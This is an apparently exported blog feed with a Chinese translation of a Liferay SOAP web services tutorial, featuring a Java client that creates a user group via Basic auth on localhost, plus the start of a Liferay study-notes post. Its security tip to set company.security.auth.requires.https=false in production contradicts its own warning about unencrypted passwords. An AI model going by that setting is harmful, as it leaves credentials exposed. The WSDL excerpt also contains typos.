(wsdl)<ul><li><code>addGroupUserGroups</code></li><li><code>addTeamUserGroups</code></li><li><code>addUserGroup</code></li><li><code>deleteUserGroup</code></li><li><code>getUserGroup</code></li><li><code>getUserUserGroups</code></li><li><code>unsetGroupUserGroups</code></li><li><code>unsetTeamUserGroups</code></li><li><code>updateUserGroup</code></li></ul></li></ul><blockquote><p><strong>Note</strong>: Liferay 的开发人员使用一个名为 <em>Service Builder</em> 的工具，通过 SOAP 自动公开他们的服务。如果您对使用 <em>Service Builder</em> 感兴趣，请参阅本指南中的服务构建器章节。</p></blockquote><p>每个 web service 都列出了其名称、操作和到其 WSDL 文件的链接。WSDL 文件是用 XML 编写的，并提供了描述和定位 web service 的模型。</p><p>下面是 <code>UserGroup</code> 的 <code>addUserGroup</code> 操作的 WSDL 摘录:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wsdl:</span>operation</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>addUserGroup<span class="token punctuation">"</span></span> <span class="token attr-name">parametterOrder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name descriptionpublicLayoutSetPropertyId privateLayoutSetPropertyId<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wsdl:</span>input</span> <span class="token attr-name">message</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>impl:addUserGroupRequest<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>addUserGroupRequest<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    &lt;wsdl:outputMessage="impl:addUserGroupResponse" name="assUserGroupResponse"/&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">wsdl:</span>operation</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要使用该服务，您需要将 WSDL URL 连同登录凭证传递给服务的 SOAP 服务定位器 (service locator)。我们将在下一节中向您展示一个示例。</p><p>接下来，让我们调用 web service !</p><br><h2 id="SOAP-JAVA-CLIENT"><a href="#SOAP-JAVA-CLIENT" class="headerlink" title="SOAP JAVA CLIENT"></a>SOAP JAVA CLIENT</h2><p>可以使用 Eclipse IDE 轻松地设置 Java web service 客户端。方法如下:</p><p>在 Eclipse 中，为计划在客户端代码中使用的每个服务向项目添加一个新的 Web Service Client。对于我们的目的，我们正在构建的客户端需要 portal 的 Company、User 和 User Group 服务的 Web Service Client。</p><p>添加您的 Web service 客户端在 Eclipse IDE 中,单击 new → other…,然后点开 Web Services 类别。单击 Web Service Client。</p><p>对于您创建的每个客户端，都会提示您输入所需服务的服务定义(WSDL)。由于我们的示例 web service 客户端将使用 Liferay Portal 的 Company、User 和 UserGroup 服务，因此我们需要输入以下 WSDL:</p><pre class="line-numbers language-uri" data-language="uri"><code class="language-uri"><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">localhost</span><span class="token port-segment"><span class="token port-delimiter">:</span><span class="token port">8080</span></span></span><span class="token path"><span class="token path-separator">/</span>api<span class="token path-separator">/</span>axis<span class="token path-separator">/</span>Portal_CompanyService</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">wsdl</span></span></span><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">localhost</span><span class="token port-segment"><span class="token port-delimiter">:</span><span class="token port">8080</span></span></span><span class="token path"><span class="token path-separator">/</span>api<span class="token path-separator">/</span>axis<span class="token path-separator">/</span>Portal_UserService</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">wsdl</span></span></span><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">localhost</span><span class="token port-segment"><span class="token port-delimiter">:</span><span class="token port">8080</span></span></span><span class="token path"><span class="token path-separator">/</span>api<span class="token path-separator">/</span>axis<span class="token path-separator">/</span>Portal_UserGroupService</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">wsdl</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dev.liferay.com/documents/12052/378662/api-web-svc-wsdl.png/f35ee8a8-3cc5-4013-7bbe-687d7f2b2f5c?version=1.0&amp;t=1516399490165" alt="新建 Web Service Client"></p><p>当您指定 WSDL 时，Eclipse 将自动添加使用该 web service 所需的辅助文件和库。非常棒！在您使用上面的 WSDL 之一创建了 web 服务客户端项目之后，您需要使用剩余的 WSDL 在项目中创建其他客户端。在一个现有的项目中创建一个额外的客户端,右键单击项目并选择 New → Web Service Client。单击 Next，输入 WSDL，并完成向导。</p><p>下面的代码定位并调用操作来创建一个名为 <code>MyUserGroup</code> 的新用户组，并向其添加屏幕显示名称为 <em>test</em> 的用户。在 web service client 项目中创建一个 <code>LiferaySoapClient.java</code> 文件，并向其添加以下代码。如果您在一个包中创建这个类，而不是在下面代码中指定的那个包中，那么就用您的包替换这个包。要从 Eclipse 运行客户端，请确保您的 Liferay 服务器正在运行，请右键单击 <code>LiferaySoapClient.java</code> 类，并选择 _Run as java application_。检查控制台，检查服务调用是否成功。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>model<span class="token punctuation">.</span></span><span class="token class-name">CompanySoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>model<span class="token punctuation">.</span></span><span class="token class-name">UserGroupSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">CompanyServiceSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">CompanyServiceSoapServiceLocator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserGroupServiceSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserGroupServiceSoapServiceLocator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserServiceSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserServiceSoapServiceLocator</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LiferaySoapClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> remoteUser <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> virtualHost <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> groupName <span class="token operator">=</span> <span class="token string">"MyUserGroup"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> serviceCompanyName <span class="token operator">=</span> <span class="token string">"Portal_CompanyService"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> serviceUserName <span class="token operator">=</span> <span class="token string">"Portal_UserService"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> serviceUserGroupName <span class="token operator">=</span> <span class="token string">"Portal_UserGroupService"</span><span class="token punctuation">;</span>            <span class="token keyword">long</span> userId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment">// Locate the Company</span>            <span class="token class-name">CompanyServiceSoapServiceLocator</span> locatorCompany <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">CompanyServiceSoapServiceLocator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">CompanyServiceSoap</span> soapCompany <span class="token operator">=</span>                locatorCompany<span class="token punctuation">.</span><span class="token function">getPortal_CompanyService</span><span class="token punctuation">(</span>                    <span class="token function">_getURL</span><span class="token punctuation">(</span>remoteUser<span class="token punctuation">,</span> password<span class="token punctuation">,</span> serviceCompanyName<span class="token punctuation">,</span>                            <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">CompanySoap</span> companySoap <span class="token operator">=</span>                soapCompany<span class="token punctuation">.</span><span class="token function">getCompanyByVirtualHost</span><span class="token punctuation">(</span>virtualHost<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Locate the User service</span>            <span class="token class-name">UserServiceSoapServiceLocator</span> locatorUser <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">UserServiceSoapServiceLocator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">UserServiceSoap</span> userSoap <span class="token operator">=</span> locatorUser<span class="token punctuation">.</span><span class="token function">getPortal_UserService</span><span class="token punctuation">(</span>                <span class="token function">_getURL</span><span class="token punctuation">(</span>remoteUser<span class="token punctuation">,</span> password<span class="token punctuation">,</span> serviceUserName<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Get the ID of the remote user</span>            userId <span class="token operator">=</span> userSoap<span class="token punctuation">.</span><span class="token function">getUserIdByScreenName</span><span class="token punctuation">(</span>                companySoap<span class="token punctuation">.</span><span class="token function">getCompanyId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> remoteUser<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"userId for user named "</span> <span class="token operator">+</span> remoteUser <span class="token operator">+</span>                    <span class="token string">" is "</span> <span class="token operator">+</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Locate the UserGroup service</span>            <span class="token class-name">UserGroupServiceSoapServiceLocator</span> locator <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">UserGroupServiceSoapServiceLocator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">UserGroupServiceSoap</span> usergroupsoap <span class="token operator">=</span>                locator<span class="token punctuation">.</span><span class="token function">getPortal_UserGroupService</span><span class="token punctuation">(</span>                    <span class="token function">_getURL</span><span class="token punctuation">(</span>remoteUser<span class="token punctuation">,</span> password<span class="token punctuation">,</span> serviceUserGroupName<span class="token punctuation">,</span>                            <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Get the user's user groups</span>            <span class="token class-name">UserGroupSoap</span><span class="token punctuation">[</span><span class="token punctuation">]</span> usergroups <span class="token operator">=</span> usergroupsoap<span class="token punctuation">.</span><span class="token function">getUserUserGroups</span><span class="token punctuation">(</span>                    userId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"User groups for userId "</span> <span class="token operator">+</span> userId <span class="token operator">+</span> <span class="token string">" ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> usergroups<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\t"</span> <span class="token operator">+</span> usergroups<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment">// Adds the user group if it does not already exist</span>            <span class="token class-name">String</span> groupDesc <span class="token operator">=</span> <span class="token string">"My new user group"</span><span class="token punctuation">;</span>            <span class="token class-name">UserGroupSoap</span> newUserGroup <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> userGroupAlreadyExists <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                newUserGroup <span class="token operator">=</span> usergroupsoap<span class="token punctuation">.</span><span class="token function">getUserGroup</span><span class="token punctuation">(</span>groupName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>newUserGroup <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"User with userId "</span> <span class="token operator">+</span> userId <span class="token operator">+</span>                            <span class="token string">" is already a member of UserGroup "</span> <span class="token operator">+</span>                                    newUserGroup<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    userGroupAlreadyExists <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">// Print cause, but continue</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getLocalizedMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>userGroupAlreadyExists<span class="token punctuation">)</span> <span class="token punctuation">{</span>                newUserGroup <span class="token operator">=</span> usergroupsoap<span class="token punctuation">.</span><span class="token function">addUserGroup</span><span class="token punctuation">(</span>                        groupName<span class="token punctuation">,</span> groupDesc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Added user group named "</span> <span class="token operator">+</span> groupName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">long</span> users<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>userId<span class="token punctuation">}</span><span class="token punctuation">;</span>                userSoap<span class="token punctuation">.</span><span class="token function">addUserGroupUsers</span><span class="token punctuation">(</span>newUserGroup<span class="token punctuation">.</span><span class="token function">getUserGroupId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                        users<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment">// Get the user's user groups</span>            usergroups <span class="token operator">=</span> usergroupsoap<span class="token punctuation">.</span><span class="token function">getUserUserGroups</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"User groups for userId "</span> <span class="token operator">+</span> userId <span class="token operator">+</span> <span class="token string">" ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> usergroups<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\t"</span> <span class="token operator">+</span> usergroups<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">getLocalizedMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">URL</span> <span class="token function">_getURL</span><span class="token punctuation">(</span><span class="token class-name">String</span> remoteUser<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">,</span>                        <span class="token class-name">String</span> serviceName<span class="token punctuation">,</span> <span class="token keyword">boolean</span> authenticate<span class="token punctuation">)</span>                        <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>                <span class="token comment">// Unauthenticated url</span>                <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"http://localhost:8080/api/axis/"</span> <span class="token operator">+</span> serviceName<span class="token punctuation">;</span>                <span class="token comment">// Authenticated url</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>authenticate<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> remoteUser <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> password                                        <span class="token operator">+</span> <span class="token string">"@localhost:8080/api/axis/"</span>                                        <span class="token operator">+</span> serviceName<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行此客户端应该生成如下示例所示的输出:</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">userId for user named test is <span class="token number">10196</span>User groups for user <span class="token number">10196</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token property">java.rmi.RemoteException:</span> No UserGroup exists with the key <span class="token operator">{</span>companyId<span class="token operator">=</span><span class="token number">10154</span><span class="token punctuation">,</span>name<span class="token operator">=</span>MyUserGroup<span class="token operator">}</span>Added user group namedAdded user to user group named MyUserGroupUser groups for user <span class="token number">10196</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    MyUserGroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>控制台的输出告诉我们这个用户没有组，然后将这个用户添加到 UserGroup <code>MyUserGroup</code>。</p><p>您可能会想，“但是抛出了一个错误!” 我们做错了什么事!“ 是的，抛出了一个错误(<code>java.rmi.RemoteException:</code>)，但是我们仍然坐在这里，就像一个冰淇淋三明治一样酷。” 抛出异常仅仅是因为在创建 <code>UserGroup</code> 之前调用了 <code>UserGroup</code> 检查。因为输出的下面几行说 <code>Added user group named...</code>，好了。别担心, 要快乐!</p><p>关于这个例子，有几点需要注意:</p><ul><li>身份验证是使用 HTTP Basic 身份验证完成的，这对于生产环境是不合适的，因为密码是未加密的。在本例中，它只是为了方便而使用。在生产中，应该设置 <code>company.security.auth.requires.https=false</code>。请参阅 Liferay 的 <a href="http://docs.liferay.com/portal/6.2/propertiesdoc/portal.properties.html"><code>portal.properties</code></a> 文件以获取更多信息。</li><li>屏幕名称和密码作为凭证在 URL 中传递。</li><li>服务的名称(例如，<code>Portal_UserGroupService</code>) 在 URL 的末尾指定。请记住，<font color="#FF6666">服务名称可以在 web 服务列表中找到</font>。</li></ul><p>操作 <code>getCompanyByVirtualHost()</code>、<code>getUserIdByScreenName()</code>、<code>getUserUserGroups()</code>、<code>addUserGroup()</code> 和 <code>addUserGroupUsers()</code> 是为 WSDL 文件中的 <code>-ServiceSOAP</code> 类 <code>CompanyServiceSoap</code>、<code>UserServiceSoap</code> 和 <code>UserGroupServiceSoap</code> 指定的。关于每个 Liferay web service 的参数类型、参数顺序、请求类型、响应类型和返回类型的信息可以方便地在 WSDL 中指定。一切都在你的身边!</p><p>接下来，让我们用 JavaScript 实现 web service 客户端。</p><blockquote><p>原文<a href="https://dev.liferay.com/zh/develop/tutorials/-/knowledge_base/6-2/soap-web-services#soap-php-client">使用 PHP 实现 web service 客户端</a></p></blockquote><br><h2 id="SOAP-JavaScript-CLIENT"><a href="#SOAP-JavaScript-CLIENT" class="headerlink" title="SOAP JavaScript CLIENT"></a>SOAP JavaScript CLIENT</h2><p>您可以用<font color="#FF6666">支持 Web Service 调用的任何语言编写客户端</font>。让我们调用我们在创建 Java 客户端时所做的相同操作，这次使用 JavaScript 客户端:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>请记住，您<font color="#FF6666">可以用任何支持使用 SOAP Web Service 的语言实现 web service 客户端</font>。要学习如何实现 OAuth，以便您可以访问第三方服务，请参见授权访问使用 OAuth 教程的服务。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Liferay </tag>
            
            <tag> WebService </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liferay 学习笔记</title>
      <link href="/2018/06/26/liferay/"/>
      <url>/2018/06/26/liferay/</url>
      
        <content type="html"><![CDATA[<p>新项目需要用 Liferay Portal 框架进行开发，之前没接触过，为了不反复查资料，遇到的东西还是记下来比较好…愁…</p><span id="more"></span><h2 id="环境及注意事项"><a href="#环境及注意事项" class="headerlink" title="环境及注意事项"></a>环境及注意事项</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>安装了 Liferay 插件的 IDE</li><li>Liferay SDK</li><li>扩展了了 Liferay 的 Tomcat</li><li>JDK 7</li></ul><br><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>工作空间设置为 <strong>utf-8</strong> 编码</li><li>Ant 编译时会在 SDK dist 目录下打个 war 包，然后复制到 Tomcat deploy 目录下，<strong>部署成功后会将其删除</strong>(判断部署成功的方法)</li><li>整个项目虽然显示在 Eclipse 中，但实际上并不在 Eclipse 空间中，而是在 Liferay SDK 所在目录里…<strong>不在工作空间里…不在工作空间里…不在空间里…</strong></li></ul><br><h2 id="开发模式"><a href="#开发模式" class="headerlink" title="开发模式"></a>开发模式</h2><ul><li>Portlet：Liferay 插件，结构与 Web 工程类似</li><li>HOOK：重写 Liferay 框架中的默认方法或页面，避免修改源码</li><li>EXT： 不推荐</li><li>Layout：布局模板</li><li>Theme：主题开发</li></ul><br><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="WEB-INF"><a href="#WEB-INF" class="headerlink" title="WEB-INF"></a>WEB-INF</h3><h4 id="portlet-xml"><a href="#portlet-xml" class="headerlink" title="portlet.xml"></a>portlet.xml</h4><p>每新建一个 portlet 都会自动添加一个 <code>&lt;portlet&gt;</code> 标签</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- portlet id, 存入数据库中的 id --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-name</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 页面上的显示名称 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">&gt;</span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 后台 java 类 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-class</span><span class="token punctuation">&gt;</span></span>com.baozi.demo.hello.HelloPortlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-class</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 每个模式所对应的 jsp 文件 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>view-template<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/html/hello/view.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>edit-template<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/html/hello/edit.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>help-template<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span 